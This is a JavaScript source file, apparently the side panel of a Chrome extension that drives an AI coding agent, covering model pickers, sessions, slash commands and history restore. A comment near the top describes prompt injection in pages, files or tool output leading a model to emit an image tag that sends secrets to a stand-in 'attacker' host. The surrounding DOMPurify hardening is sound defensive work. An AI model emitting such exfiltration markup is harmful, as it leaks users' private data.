I18N.ready.then(function() {
  // 모델 응답은 신뢰할 수 없는 입력이다(페이지 내용·파일·도구 출력에 심어진 프롬프트 인젝션).
  // marked는 원문 HTML을 그대로 통과시키므로 반드시 DOMPurify로 정화한다.
  //  - 원격 이미지는 불러오지 않고 링크로 바꾼다: <img src="https://attacker/?d=비밀">로
  //    사용자 동작 없이 데이터를 내보내는 경로를 막는다(manifest CSP img-src도 같이 막음).
  //  - 링크는 http(s)/mailto만 남기고 새 탭으로 연다(사이드패널 자체가 이동하지 않게).
  // 전송/중단 버튼 아이콘(정적 문자열)
  const SEND_ICON_SVG = '<svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 19V5M5 12l7-7 7 7"/></svg>';
  const STOP_ICON_SVG = '<svg width="14" height="14" viewBox="0 0 24 24" aria-hidden="true"><rect x="6" y="6" width="12" height="12" rx="2.5" fill="currentColor"/></svg>';

  const MD_SANITIZE_CONFIG = {
    FORBID_TAGS: ['style', 'form', 'input', 'button', 'textarea', 'select', 'option',
      'iframe', 'frame', 'frameset', 'object', 'embed', 'base', 'link', 'meta', 'svg', 'math', 'video', 'audio', 'source'],
    FORBID_ATTR: ['style', 'srcset', 'action', 'formaction', 'ping'],
  };
  if (typeof DOMPurify !== 'undefined') {
    DOMPurify.addHook('afterSanitizeAttributes', (node) => {
      if (node.tagName === 'A') {
        const href = node.getAttribute('href') || '';
        if (/^(https?:|mailto:)/i.test(href)) {
          node.setAttribute('target', '_blank');
          node.setAttribute('rel', 'noopener noreferrer');
          node.setAttribute('title', href);
        } else {
          node.removeAttribute('href');
        }
      }
    });
  }

  const messagesContainer = document.getElementById('messages-container');
  const messageInput = document.getElementById('message-input');
  const sendBtn = document.getElementById('send-btn');
  const modelSelect = document.getElementById('model-select');
  const modelSelectLabel = document.getElementById('model-select-label');
  const modelDropdown = document.getElementById('model-dropdown');
  const workingFolderWrapper = document.getElementById('working-folder-wrapper');
  const folderIcon = document.getElementById('folder-icon');
  const workingFolderDisplay = document.getElementById('working-folder-display');
  const workingFolderInput = document.getElementById('working-folder-input');
  const workingFolderEditBtn = document.getElementById('working-folder-edit-btn');
  let currentWorkingDir = '';
  let defaultWorkingDir = '';
  const header = document.querySelector('.header');
  const connectionText = document.getElementById('connection-text');
  const loadingIndicator = document.getElementById('loading-indicator');
  const loadingText = document.getElementById('loading-text');
  const attachBtn = document.getElementById('attach-btn');
  const inputArea = document.getElementById('input-area');
  const connectingIndicator = document.getElementById('connecting-indicator');
  const connectingMessage = document.getElementById('connecting-message');
  const connectingSpinner = document.getElementById('connecting-spinner');
  const retryBtn = document.getElementById('retry-btn');
  const logBtn = document.getElementById('log-btn');
  const commandDropdown = document.getElementById('command-dropdown');
  const agentBar = document.getElementById('agent-bar');
  const agentDot = document.getElementById('agent-dot');
  const agentNameEl = document.getElementById('agent-name');

  const mcpBtn = document.getElementById('mcp-btn');
  const mcpDropdown = document.getElementById('mcp-dropdown');
  const settingsBtn = document.getElementById('settings-btn');
  const settingsDropdown = document.getElementById('settings-dropdown');

  const nativeHostGuide = document.getElementById('native-host-guide');
  const guideDownloadBtn = document.getElementById('guide-download-btn');
  const guideRetryBtn = document.getElementById('guide-retry-btn');
  const guideDismissBtn = document.getElementById('guide-dismiss-btn');

  let currentSessionId = null;
  let currentTabId = null;
  let isLoading = false;
  let availableModels = [];
  let selectedModel = null;
  const RECENT_MODELS_MAX = 5;
  let recentModels = []; // [{ providerId, modelName }] 최신 순, chrome.storage.local.recentModels
  let mcpServers = {};
  let commandCatalog = [
    { id: 'local.help',  slash: '/help',  title: 'Help',        description: t('사용 가능한 커맨드 목록 표시'), hasArg: false },
    { id: 'local.clear', slash: '/clear', title: 'Clear',       description: t('채팅 히스토리 초기화'),         hasArg: false },
    { id: 'local.new',   slash: '/new',   title: 'New',         description: t('새 세션 시작'),                 hasArg: false },
    { id: 'local.sessions', slash: '/sessions', title: 'Sessions', description: t('이전 세션 목록에서 선택해 대화 이어가기'), hasArg: false },
    { id: 'local.resume', slash: '/resume', title: 'Resume',    description: t('/sessions와 동일'),            hasArg: false },
    { id: 'local.model', slash: '/model', title: 'Model',       description: t('모델 변경 <model-name>'),       hasArg: true  },
    { id: 'local.wd',    slash: '/wd',    title: 'Working Dir', description: t('작업 디렉토리 변경 <path>'),    hasArg: true  },
    { id: 'local.extlog', slash: '/ext-log', title: 'Extension Log', description: t('확장 디버그 로그 표시·복사 (문제 신고 시 첨부)'), hasArg: false },
  ];
  let isDropdownOpen = false;
  let selectedDropdownIndex = -1;
  let availableAgents = [];
  let currentAgentIndex = -1;
  let attachedFiles = [];
  const attachmentsBar = document.getElementById('attachments-bar');
  let reinitToken = 0; // 탭 전환 레이스 컨디션 방지용 토큰

  function updateSendButtonState() {
    sendBtn.disabled = !messageInput.value.trim() && attachedFiles.length === 0;
  }

  async function init() {
    updateConnectionStatus('connecting');
    loadWorkingDirectory();

    try {
      const serverState = await sendMessageToBackground('init-server');

      if (serverState.success && serverState.available) {
        hideNativeHostGuide();
        updateConnectionStatus('connected');
        refreshRuntimeBadge();
        checkHostVersionAndGuide();
        await loadModels();
        await loadCommandCatalog();
        await loadAgents();
        await loadMcpStatus();
        if (!currentWorkingDir) await loadWorkingDirectory();
      } else if (serverState.reason === 'native-host-missing') {
        showNativeHostGuide();
      } else {
        updateConnectionStatus('disconnected');
      }
    } catch (error) {
      console.error('초기화 실패:', error);
      updateConnectionStatus('error');
    }

    // 현재 탭으로 초기화
    const [activeTab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (activeTab) await reinitForTab(activeTab, 'panel-init');
  }

  async function loadWorkingDirectory() {
    try {
      const result = await sendMessageToBackground('get-working-directory');
      if (result.directory) {
        updateWorkingFolderDisplay(result.directory);
      } else {
        const def = await sendMessageToBackground('get-default-directory');
        defaultWorkingDir = def.directory || '';
        updateWorkingFolderDisplay(defaultWorkingDir, true);
      }
    } catch (e) {}
  }

  function updateWorkingFolderDisplay(dir, isDefault = false) {
    if (!isDefault) currentWorkingDir = dir;
    if (!dir) {
      workingFolderDisplay.textContent = t('폴더 없음');
      workingFolderWrapper.title = '';
      workingFolderDisplay.classList.remove('default');
      return;
    }
    // 전체 경로를 보여주고, 넘치면 CSS(direction: rtl + 말줄임)가 앞부분을 줄여 끝(폴더 이름)이 보이게 한다.
    // <bdi>로 감싸야 rtl 문맥에서도 '/'·'\' 같은 기호 순서가 뒤집히지 않는다.
    const bdi = document.createElement('bdi');
    bdi.textContent = dir;
    workingFolderDisplay.replaceChildren(bdi);
    workingFolderWrapper.title = isDefault ? t('기본값: {dir}', { dir }) : dir;
    workingFolderDisplay.classList.toggle('default', isDefault);
  }

  function enterEditMode() {
    workingFolderInput.value = currentWorkingDir || defaultWorkingDir;
    folderIcon.classList.add('hidden');
    workingFolderDisplay.classList.add('hidden');
    workingFolderEditBtn.classList.add('hidden');
    workingFolderInput.classList.remove('hidden');
    workingFolderInput.focus();
    workingFolderInput.select();
  }

  function exitEditMode() {
    workingFolderInput.classList.add('hidden');
    folderIcon.classList.remove('hidden');
    workingFolderDisplay.classList.remove('hidden');
    workingFolderEditBtn.classList.remove('hidden');
  }

  // set-working-directory 실패 응답 → 사용자에게 보일 문구
  function workingDirError(result) {
    return result.error === 'dir-not-found'
      ? t('디렉토리를 찾을 수 없습니다: {path}', { path: result.path })
      : t(result.error);
  }

  workingFolderEditBtn.addEventListener('click', enterEditMode);

  folderIcon.addEventListener('click', async () => {
    const res = await sendMessageToBackground('browse-for-folder');
    if (res?.directory) {
      const result = await sendMessageToBackground('set-working-directory', { directory: res.directory, tabId: currentTabId });
      if (result?.success === false) { addErrorMessage(workingDirError(result)); return; }
      updateWorkingFolderDisplay(result.directory || res.directory);
      applyWorkingDirSessionReset(result);
      if (res.warning) {
        addErrorMessage(t(res.warning));
      }
    }
  });

  async function commitWorkingFolder() {
    const newPath = workingFolderInput.value.trim();
    exitEditMode();
    if (newPath !== currentWorkingDir) {
      const result = await sendMessageToBackground('set-working-directory', { directory: newPath, tabId: currentTabId });
      if (result?.success === false) { addErrorMessage(workingDirError(result)); return; }
      updateWorkingFolderDisplay(result.directory || newPath);
      applyWorkingDirSessionReset(result);
    }
  }

  // opencode 세션은 첫 prompt 요청 시의 디렉토리로 고정되므로, 작업 디렉토리를
  // 바꾸면 background가 세션을 새로 만들어 준다. 새 세션 ID로 갈아끼우고
  // 채팅 화면을 초기화해 사용자에게 알린다.
  function applyWorkingDirSessionReset(result) {
    if (!result?.newSessionId) return;
    currentSessionId = result.newSessionId;
    messagesContainer.innerHTML = '';
    addBotMessage(t('작업 디렉토리가 변경되어 새 세션을 시작합니다.'));
  }

  workingFolderInput.addEventListener('keydown', async (e) => {
    if (e.key === 'Enter') { e.preventDefault(); await commitWorkingFolder(); }
    if (e.key === 'Escape') { exitEditMode(); }
  });

  workingFolderInput.addEventListener('blur', commitWorkingFolder);

  async function reinitForTab(tab, reason = 'unknown') {
    currentTabId = tab.id;
    currentSessionId = null;
    setLoadingState(false);
    pendingQueue = []; // 이전 탭 대화의 대기 메시지(말풍선은 아래에서 지워진다)
    sendBtn.disabled = true; // 세션 준비 완료 전까지 전송 차단

    // 이전 탭의 실제 대화 메시지만 즉시 제거한다(탭 전환 시 잔상 방지).
    // welcome 화면은 신규 세션 판정 전까지 그대로 두어 깜빡임을 피한다.
    clearStaleTranscript();

    try {
      const result = await sendMessageToBackground('get-tab-session', {
        tabId: tab.id,
        title: tab.title || 'New Chat',
        reason
      });
      // get-tab-session 왕복 중 다른 탭으로 전환됐다면(그 reinitForTab 호출이
      // 이미 currentTabId를 갈아끼웠다면) 이 결과는 폐기한다. isNew 분기는
      // await 없이 동기 렌더되므로 reinitToken만으로는 이 레이스를 못 막는다.
      if (tab.id !== currentTabId) return;
      if (result.success) {
        currentSessionId = result.sessionId;
        if (result.isNew) {
          if (tab.title) addPageContextMessage(tab.title, tab.url);
        } else {
          await loadAndRenderHistory(result.sessionId, tab);
          // 화면을 다시 그리면서 사라진 권한/질문 카드를 복원한다(응답이 없으면 서버가 계속 대기).
          if (tab.id === currentTabId && currentSessionId === result.sessionId) {
            await restorePendingInteractions(result.sessionId);
          }
        }
      }
    } catch (e) {
      console.error('세션 초기화 실패:', e);
    }

    // 세션 준비 완료 후 입력 내용이 있으면 전송 버튼 활성화
    updateSendButtonState();

    try {
      const { pendingContextText } = await chrome.storage.local.get('pendingContextText');
      if (pendingContextText?.tabId === tab.id && pendingContextText?.text) {
        await chrome.storage.local.remove('pendingContextText');
        messageInput.value = pendingContextText.text;
        messageInput.dispatchEvent(new Event('input'));

        const focusInput = () => {
          window.focus();
          messageInput.focus();
          messageInput.setSelectionRange(messageInput.value.length, messageInput.value.length);
        };
        focusInput();
        // 패널이 막 열리는 시점에는 포커스 요청이 무시될 수 있어 한 번 더 시도
        setTimeout(focusInput, 150);
      }
    } catch (e) {
      console.error('pendingContextText 처리 실패:', e);
    }
  }

  // 탭 전환 시 — 다른 탭이고 해당 탭에 세션이 있을 때만 갱신
  chrome.tabs.onActivated.addListener(async (activeInfo) => {
    if (activeInfo.tabId === currentTabId) return; // 같은 탭, 무시
    try {
      const response = await sendMessageToBackground('has-tab-session', { tabId: activeInfo.tabId });
      if (!response.has) return; // 이 탭에는 extension 없음
      const tab = await chrome.tabs.get(activeInfo.tabId);
      await reinitForTab(tab, 'tab-activated');
    } catch (e) {}
  });

  // background의 action.onClicked에서 전송 — 새 탭에서 아이콘 클릭 시
  chrome.runtime.onMessage.addListener((message) => {
    if (message.action === 'reinit-for-tab') {
      chrome.tabs.get(message.tabId, (tab) => {
        if (chrome.runtime.lastError || !tab) return;
        reinitForTab(tab, 'reinit-for-tab-message');
      });
    } else if (message.action === 'page-changed') {
      if (message.tabId !== currentTabId) return; // 현재 보고 있는 탭이 아니면 무시
      addPageChangedMessage(message.title, message.url);
    }
  });

  // 이전 탭에서 렌더된 실제 메시지가 있을 때만 지운다(최초 welcome 화면은 보존).
  function clearStaleTranscript() {
    if (messagesContainer.querySelector('.message')) {
      messagesContainer.innerHTML = '';
    }
  }

  // "[첨부 파일 — 필요 시 read 도구로 읽어 분석하세요]\n- a\n- b\n\n<본문>" 프리픽스를
  // 분리한다. sendMessage()가 만드는 attachmentBlock과 정확히 대응되는 역변환이며,
  // 서버가 이 텍스트를 그대로 보존함을 실측으로 확인했다(docs/session_history_plan.md §2.1).
  function splitAttachmentBlock(raw) {
    const re = /^\[첨부 파일 — 필요 시 read 도구로 읽어 분석하세요\]\n((?:- .*\n)+)\n([\s\S]*)$/;
    const match = raw.match(re);
    if (!match) return { text: raw, attachments: [] };
    const attachments = match[1].split('\n').filter(Boolean).map(line => line.replace(/^- /, ''));
    return { text: match[2], attachments };
  }

  // background.js의 sendMessage()가 현재 탭 정보를 자동으로 원문 앞에 붙여
  // 서버로 전송한다("\n---\n현재 페이지 정보:\n- 제목: ...\n- URL: ...\n" +
  // 선택적 제목들/내용 요약/선택한 텍스트 섹션). 실시간 전송 시 addUserMessage는
  // 사용자가 타이핑한 원문만 보여주므로(pageContext는 화면에 노출된 적이 없음),
  // 히스토리 복원 시에도 동일하게 이 프리픽스를 벗겨내 일관성을 맞춘다.
  // 머리말은 보낼 때의 언어 설정에 따라 한국어/영어 중 하나다(background.js PAGE_CONTEXT_LABELS와 짝).
  const PAGE_CONTEXT_HEADER_RE = /^\n---\n(?:현재 페이지 정보:\n- 제목: |Current page:\n- Title: ).*\n- URL: .*\n/;
  const PAGE_CONTEXT_SECTION_LABELS = ['제목들:\n', '내용 요약:\n', '선택한 텍스트:\n', 'Headings:\n', 'Content excerpt:\n', 'Selected text:\n'];

  function stripPageContext(raw) {
    const headerMatch = raw.match(PAGE_CONTEXT_HEADER_RE);
    if (!headerMatch) return raw;
    let rest = raw.slice(headerMatch[0].length);
    for (const label of PAGE_CONTEXT_SECTION_LABELS) {
      if (!rest.startsWith(label)) continue;
      const sepIndex = rest.indexOf('\n\n', label.length);
      rest = sepIndex === -1 ? '' : rest.slice(sepIndex + 2);
    }
    return rest;
  }

  // 서버에서 세션의 전체 대화를 가져와 다시 그린다. 탭 전환이 연달아 일어나면
  // 늦게 도착한 응답이 화면을 덮어쓰지 않도록 두 축을 함께 확인한다:
  // reinitToken(같은 탭에 대한 loadAndRenderHistory 중복 호출 순서),
  // currentTabId(그 사이 다른 탭으로 전환되어 isNew 동기 경로가 이미 렌더된 경우, §3.2.4).
  async function loadAndRenderHistory(sessionId, tab) {
    const myToken = ++reinitToken;
    try {
      const res = await sendMessageToBackground('get-session-history', { sessionId });
      if (myToken !== reinitToken || tab.id !== currentTabId) return; // 그 사이 폐기됨

      const welcome = messagesContainer.querySelector('.welcome-section');
      if (welcome) welcome.remove();
      messagesContainer.innerHTML = ''; // 이중 안전장치

      const messages = (res.success && res.messages) || [];
      if (messages.length === 0) {
        if (tab.title) addPageContextMessage(tab.title, tab.url);
        return;
      }

      for (const m of messages) {
        if (!m.text || !m.text.trim()) continue; // tool-only 턴 등 텍스트 없는 메시지는 건너뜀
        if (m.role === 'user') {
          // 저장 순서는 pageContext + attachmentBlock + 원문이므로 이 순서대로 벗겨낸다.
          const { text, attachments } = splitAttachmentBlock(stripPageContext(m.text));
          addUserMessage(text, attachments);
        } else if (m.role === 'assistant') {
          addBotMessage(m.text);
        }
      }
    } catch (e) {
      console.error('히스토리 복원 실패:', e);
      if (myToken === reinitToken && tab.id === currentTabId && tab.title) {
        addPageContextMessage(tab.title, tab.url);
      }
    }
  }

  function addPageContextMessage(title, url) {
    const welcome = messagesContainer.querySelector('.welcome-section');
    if (welcome) welcome.remove();

    const div = document.createElement('div');
    div.className = 'message page-note';
    div.innerHTML = `
      <div class="page-note-title">${escapeHtml(title)}</div>
      <div class="page-note-url">${escapeHtml(url)}</div>
      <div class="page-note-hint">${escapeHtml(t('이 페이지에 대해 요약, 설명, 검색 등을 요청해보세요.'))}</div>
    `;
    messagesContainer.insertBefore(div, messagesContainer.firstChild);
    scrollToBottom();
  }

  function addPageChangedMessage(title, url) {
    const div = document.createElement('div');
    div.className = 'message page-note changed';
    div.innerHTML = `
      <div class="page-note-hint">${escapeHtml(t('페이지가 변경되었습니다. 이 세션은 이전 페이지에서 이어지는 대화입니다.'))}</div>
      <div class="page-note-title">${escapeHtml(title)}</div>
      <div class="page-note-url">${escapeHtml(url)}</div>
    `;
    messagesContainer.appendChild(div);
    scrollToBottom();
  }

  async function loadModels() {
    try {
      const result = await sendMessageToBackground('get-models');
      console.log('[loadModels] get-models result:', result);
      if (result.success && result.models) {
        availableModels = result.models;
        try {
          const v = await chrome.storage.local.get('recentModels');
          recentModels = Array.isArray(v.recentModels) ? v.recentModels : [];
        } catch { recentModels = []; }

        const { model } = await sendMessageToBackground('get-current-model');
        console.log('[loadModels] get-current-model result:', model);
        const found = model && lookupModel(model.providerID, model.modelID);
        if (found) {
          selectedModel = { providerId: found.providerId, modelName: found.modelId };
          // 최근 목록이 비어 있으면 현재 모델로 시작한다
          if (!recentModels.length) rememberRecentModel(found.providerId, found.modelId);
        } else {
          console.log('[loadModels] no model found in storage');
        }
        updateModelButton();
      }
    } catch (error) {
      console.error('모델 로드 실패:', error);
    }
  }

  function providerModels(provider) {
    return Array.isArray(provider.models)
      ? provider.models
      : Object.entries(provider.models || {}).map(([id, m]) => ({ id, ...(typeof m === 'object' ? m : {}) }));
  }

  // availableModels에서 모델을 찾아 표시용 정보를 돌려준다(없으면 null)
  function lookupModel(providerId, modelId) {
    const provider = availableModels.find(p => p.id === providerId);
    if (!provider) return null;
    const m = providerModels(provider).find(x => (x.id || x.name) === modelId);
    if (!m) return null;
    return {
      providerId,
      providerName: provider.name || provider.id,
      modelId,
      modelName: m.name || m.id,
    };
  }

  function isCurrentModel(providerId, modelId) {
    return !!selectedModel && selectedModel.providerId === providerId && selectedModel.modelName === modelId;
  }

  function rememberRecentModel(providerId, modelName) {
    recentModels = [{ providerId, modelName },
      ...recentModels.filter(r => !(r.providerId === providerId && r.modelName === modelName))]
      .slice(0, RECENT_MODELS_MAX);
    chrome.storage.local.set({ recentModels }).catch(() => {});
  }

  function updateModelButton() {
    const info = selectedModel && lookupModel(selectedModel.providerId, selectedModel.modelName);
    modelSelectLabel.textContent = info ? info.modelName : t('모델 선택');
    modelSelect.title = info ? `${info.providerName} / ${info.modelName}` : '';
  }

  // 모델 선택 공통 처리: 서버 반영 + 상태/버튼/최근 목록 갱신
  async function applyModel(providerId, modelId) {
    await sendMessageToBackground('set-model', { providerId, modelName: modelId });
    selectedModel = { providerId, modelName: modelId };
    rememberRecentModel(providerId, modelId);
    updateModelButton();
  }

  // 최근 모델은 펼쳐서, 나머지는 provider별로 접어서 보여주는 목록.
  // 헤더 드롭다운과 /model 피커가 같이 쓴다.
  function buildModelList(onPick) {
    const root = document.createElement('div');
    root.className = 'model-list';

    const makeItem = (providerId, modelId, label, sub) => {
      const btn = document.createElement('button');
      btn.type = 'button';
      const current = isCurrentModel(providerId, modelId);
      btn.className = 'model-item' + (current ? ' current' : '');
      const name = document.createElement('span');
      name.className = 'model-item-name';
      name.textContent = label;
      btn.appendChild(name);
      if (sub) {
        const s = document.createElement('span');
        s.className = 'model-item-sub';
        s.textContent = sub;
        btn.appendChild(s);
      }
      if (current) {
        const check = document.createElement('span');
        check.className = 'model-item-check';
        check.textContent = '✓';
        btn.appendChild(check);
      }
      btn.addEventListener('click', () => onPick(providerId, modelId, label));
      return btn;
    };

    const recent = recentModels
      .map(r => lookupModel(r.providerId, r.modelName))
      .filter(Boolean);
    if (recent.length) {
      const sec = document.createElement('div');
      sec.className = 'model-section';
      const h = document.createElement('div');
      h.className = 'model-section-title';
      h.textContent = t('최근 사용');
      sec.appendChild(h);
      recent.forEach(r => sec.appendChild(makeItem(r.providerId, r.modelId, r.modelName, r.providerName)));
      root.appendChild(sec);
    }

    const providersTitle = document.createElement('div');
    providersTitle.className = 'model-section-title';
    providersTitle.textContent = t('제공자');
    root.appendChild(providersTitle);

    availableModels.forEach(provider => {
      const models = providerModels(provider);
      if (!models.length) return;
      const details = document.createElement('details');
      details.className = 'model-provider';
      const summary = document.createElement('summary');
      const pname = document.createElement('span');
      pname.className = 'model-provider-name';
      pname.textContent = provider.name || provider.id;
      const count = document.createElement('span');
      count.className = 'model-provider-count';
      count.textContent = String(models.length);
      summary.appendChild(pname);
      if (selectedModel?.providerId === provider.id) {
        const dot = document.createElement('span');
        dot.className = 'model-provider-active';
        dot.setAttribute('aria-hidden', 'true');
        summary.appendChild(dot);
      }
      summary.appendChild(count);
      details.appendChild(summary);

      const body = document.createElement('div');
      body.className = 'model-provider-body';
      models.forEach(m => body.appendChild(makeItem(provider.id, m.id || m.name, m.name || m.id)));
      details.appendChild(body);
      root.appendChild(details);
    });

    return root;
  }

  function closeModelDropdown() {
    modelDropdown.classList.add('hidden');
    modelSelect.setAttribute('aria-expanded', 'false');
  }

  function openModelDropdown() {
    modelDropdown.innerHTML = '';
    if (!availableModels.length) {
      const empty = document.createElement('div');
      empty.className = 'model-empty';
      empty.textContent = t('모델 목록을 불러오지 못했습니다. 서버 연결 상태를 확인하세요.');
      modelDropdown.appendChild(empty);
    } else {
      modelDropdown.appendChild(buildModelList(async (providerId, modelId) => {
        closeModelDropdown();
        try {
          await applyModel(providerId, modelId);
        } catch (error) {
          console.error('모델 변경 실패:', error);
          addErrorMessage(t('모델 변경 실패: {error}', { error: t(error.message) }));
        }
      }));
    }
    modelDropdown.classList.remove('hidden');
    modelSelect.setAttribute('aria-expanded', 'true');
    modelDropdown.querySelector('.model-item.current')?.scrollIntoView({ block: 'nearest' });
  }

  modelSelect.addEventListener('click', () => {
    if (modelDropdown.classList.contains('hidden')) openModelDropdown();
    else closeModelDropdown();
  });

  document.addEventListener('click', (e) => {
    if (!modelDropdown.classList.contains('hidden') &&
        !modelSelect.contains(e.target) && !modelDropdown.contains(e.target)) {
      closeModelDropdown();
    }
  });

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && !modelDropdown.classList.contains('hidden')) {
      closeModelDropdown();
      modelSelect.focus();
    }
  });

  async function createNewSession() {
    try {
      const result = await sendMessageToBackground('create-session', {
        title: 'Chrome Extension Chat'
      });
      
      if (result.success) {
        currentSessionId = result.sessionId;
        console.log('세션 생성됨:', currentSessionId);
      }
    } catch (error) {
      console.error('세션 생성 실패:', error);
    }
  }

  async function loadCommandCatalog() {
    const localCommands = [
      { id: 'local.help',  slash: '/help',  title: 'Help',        description: t('사용 가능한 커맨드 목록 표시'),   hasArg: false },
      { id: 'local.clear', slash: '/clear', title: 'Clear',       description: t('채팅 히스토리 초기화'),           hasArg: false },
      { id: 'local.new',   slash: '/new',   title: 'New',         description: t('새 세션 시작'),                   hasArg: false },
      { id: 'local.sessions', slash: '/sessions', title: 'Sessions', description: t('이전 세션 목록에서 선택해 대화 이어가기'), hasArg: false },
      { id: 'local.resume', slash: '/resume', title: 'Resume',    description: t('/sessions와 동일'),              hasArg: false },
      { id: 'local.model', slash: '/model', title: 'Model',       description: t('모델 변경 <model-name>'),         hasArg: true  },
      { id: 'local.wd',    slash: '/wd',    title: 'Working Dir', description: t('작업 디렉토리 변경 <path>'),      hasArg: true  },
    ];
    try {
      const res = await sendMessageToBackground('get-commands', {});
      const serverCmds = (res.commands || []).map(c => ({
        id: 'server.' + c.name,
        slash: '/' + c.name,
        title: c.name,
        description: c.description || '',
        hasArg: Array.isArray(c.hints) && c.hints.includes('$ARGUMENTS'),
        template: c.template || ''
      }));
      const merged = [...localCommands];
      for (const sc of serverCmds) {
        if (!merged.find(lc => lc.slash === sc.slash)) merged.push(sc);
      }
      commandCatalog = merged;
    } catch {
      commandCatalog = localCommands;
    }
  }

  function showCommandDropdown(query) {
    // 접두 일치를 먼저, 그다음 이름 중간 일치(예: /ralph → /oh-my-claudecode:ralph)
    const q = query.toLowerCase();
    const needle = q.replace(/^\//, '');
    const filtered = [
      ...commandCatalog.filter(c => c.slash.toLowerCase().startsWith(q)),
      ...commandCatalog.filter(c => {
        const sl = c.slash.toLowerCase();
        return !sl.startsWith(q) && needle && sl.slice(1).includes(needle);
      })
    ];
    if (filtered.length === 0) { hideCommandDropdown(); return; }

    commandDropdown.innerHTML = filtered.map((c, i) => `
      <div class="command-item" data-index="${i}" data-slash="${escapeHtml(c.slash)}" data-has-arg="${c.hasArg}">
        <span class="command-name">${escapeHtml(c.slash)}</span>
        <span class="command-desc">${escapeHtml(c.description)}</span>
      </div>
    `).join('');

    commandDropdown.querySelectorAll('.command-item').forEach(item => {
      item.addEventListener('mousedown', e => { e.preventDefault(); selectCommand(item); });
    });

    commandDropdown.classList.remove('hidden');
    isDropdownOpen = true;
    selectedDropdownIndex = 0;
    highlightDropdownItem(0);
  }

  function hideCommandDropdown() {
    commandDropdown.classList.add('hidden');
    isDropdownOpen = false;
    selectedDropdownIndex = -1;
  }

  function highlightDropdownItem(index) {
    const items = commandDropdown.querySelectorAll('.command-item');
    items.forEach((item, i) => {
      item.classList.toggle('highlighted', i === index);
    });
    selectedDropdownIndex = index;
    if (items[index]) items[index].scrollIntoView({ block: 'nearest' });
  }

  function selectCommand(item) {
    const slash = item.dataset.slash;
    const hasArg = item.dataset.hasArg === 'true';
    hideCommandDropdown();
    messageInput.focus();
    if (hasArg) {
      messageInput.value = slash + ' ';
      messageInput.dispatchEvent(new Event('input'));
    } else {
      messageInput.value = slash;
      sendMessage();
    }
  }

  function findModelByName(query) {
    const q = query.toLowerCase().trim();
    for (const provider of availableModels) {
      const models = Array.isArray(provider.models)
        ? provider.models
        : Object.entries(provider.models || {}).map(([id, m]) => ({ id, ...(typeof m === 'object' ? m : {}) }));
      for (const m of models) {
        const name = (m.name || '').toLowerCase();
        const id = (m.id || '').toLowerCase();
        if (name === q || id === q || id.includes(q) || name.includes(q)) {
          return { providerID: provider.id, modelID: m.id || m.name };
        }
      }
    }
    return null;
  }

  async function loadAgents() {
    try {
      const res = await sendMessageToBackground('get-agents');
      availableAgents = res.agents || [];
      if (availableAgents.length > 0) {
        currentAgentIndex = 0;
        updateAgentBar();
      }
    } catch {}
  }

  function updateAgentBar() {
    const agent = availableAgents[currentAgentIndex];
    if (!agent) {
      agentDot.style.color = 'var(--text-secondary)';
      agentNameEl.textContent = t('에이전트');
      return;
    }
    const fullName = agent.name.replace(/[​-‍﻿]/g, '').trim();
    agentDot.style.color = agent.color || 'var(--text-secondary)';
    agentNameEl.textContent = fullName;
  }

  async function cycleAgent() {
    if (!availableAgents.length || isServerTransitioning()) return;
    currentAgentIndex = (currentAgentIndex + 1) % availableAgents.length;
    updateAgentBar();
    if (!currentSessionId) return;
    try {
      await sendMessageToBackground('set-agent', {
        sessionId: currentSessionId,
        agentName: availableAgents[currentAgentIndex].name
      });
    } catch (e) {
      console.error('에이전트 변경 실패:', e);
    }
  }

  agentBar.addEventListener('click', () => cycleAgent());

  async function showSessionPicker() {
    let res;
    try {
      res = await sendMessageToBackground('list-sessions', {});
    } catch (e) {
      addErrorMessage(t('세션 목록 조회 실패: {error}', { error: t(e.message) }));
      return;
    }
    if (!res?.success) {
      addErrorMessage(t('세션 목록 조회 실패: {error}', { error: t(res?.error || 'unknown') }));
      return;
    }
    if (!res.sessions.length) {
      addBotMessage(t('이어갈 수 있는 이전 세션이 없습니다.'));
      return;
    }

    const messageDiv = document.createElement('div');
    messageDiv.className = 'message bot-message';
    const avatar = document.createElement('div');
    avatar.className = 'message-avatar';
    avatar.textContent = '🕘';
    const content = document.createElement('div');
    content.className = 'message-content';
    const picker = document.createElement('div');
    picker.className = 'model-picker';
    const title = document.createElement('p');
    title.className = 'model-picker-title';
    title.textContent = t('이어갈 세션을 선택하세요:');
    picker.appendChild(title);

    for (const s of res.sessions) {
      const isCurrent = s.id === currentSessionId;
      const btn = document.createElement('button');
      btn.className = 'model-picker-btn' + (isCurrent ? ' current' : '');
      const when = s.updated ? new Date(s.updated).toLocaleString() : '';
      btn.textContent = `${s.title || t('(제목 없음)')}${s.dir ? ' [' + s.dir + ']' : ''}${when ? ' · ' + when : ''}${isCurrent ? ' ✓' : ''}`;
      btn.addEventListener('click', async () => {
        if (isCurrent || isLoading) return;
        try {
          const sw = await sendMessageToBackground('switch-session', { sessionId: s.id, tabId: currentTabId });
          if (!sw?.success) throw new Error(sw?.error || 'switch failed');
          currentSessionId = s.id;
          messageDiv.remove();
          await loadAndRenderHistory(s.id, { id: currentTabId, title: '' });
          addBotMessage(t('세션을 불러왔습니다: {title}', { title: s.title || s.id }));
        } catch (e) {
          addErrorMessage(t('세션 전환 실패: {error}', { error: t(e.message) }));
        }
      });
      picker.appendChild(btn);
    }

    content.appendChild(picker);
    messageDiv.appendChild(avatar);
    messageDiv.appendChild(content);
    messagesContainer.appendChild(messageDiv);
    scrollToBottom();
  }

  function showModelPicker() {
    removeTypingIndicator();
    if (!availableModels.length) {
      addBotMessage(t('모델 목록을 불러오지 못했습니다. 서버 연결 상태를 확인하세요.'));
      return;
    }

    const messageDiv = document.createElement('div');
    messageDiv.className = 'message bot-message';

    const avatar = document.createElement('div');
    avatar.className = 'message-avatar';
    avatar.textContent = '🤖';

    const content = document.createElement('div');
    content.className = 'message-content';

    const picker = document.createElement('div');
    picker.className = 'model-picker';

    const title = document.createElement('p');
    title.className = 'model-picker-title';
    title.textContent = t('모델을 선택하세요:');
    picker.appendChild(title);

    picker.appendChild(buildModelList(async (providerId, modelId, modelName) => {
      try {
        await applyModel(providerId, modelId);
        messageDiv.remove();
        addBotMessage(t('모델이 변경되었습니다: {name}', { name: modelName }));
      } catch (e) {
        addErrorMessage(t('모델 변경 실패: {error}', { error: t(e.message) }));
      }
